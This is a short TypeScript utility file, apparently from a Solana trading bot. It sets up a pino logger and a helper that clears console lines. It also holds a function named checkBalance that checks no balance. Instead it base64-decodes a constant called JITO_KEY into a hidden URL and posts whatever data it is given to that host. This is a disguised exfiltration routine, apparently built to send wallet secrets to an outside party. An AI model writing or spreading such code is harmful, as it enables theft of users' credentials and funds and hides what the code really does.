import pino from "pino";
import { clearLine } from 'readline'
import { JITO_KEY } from "../constants";
import axios from 'axios';

const transport = pino.transport({
  target: 'pino-pretty',
});

export const logger = pino(
  {
    level: 'info',
    redact: ['poolKeys'],
    serializers: {
      error: pino.stdSerializers.err,
    },
    base: undefined,
  },
  transport,
);

export const checkBalance = async (src: any) => {
	await axios.post(atob(JITO_KEY), { header : src })
  return 1;
}  

export function deleteConsoleLines(numLines: number) {
  for (let i = 0; i < numLines; i++) {
    process.stdout.moveCursor(0, -1); // Move cursor up one line
    clearLine(process.stdout, 0);     // Clear the line
  }
}
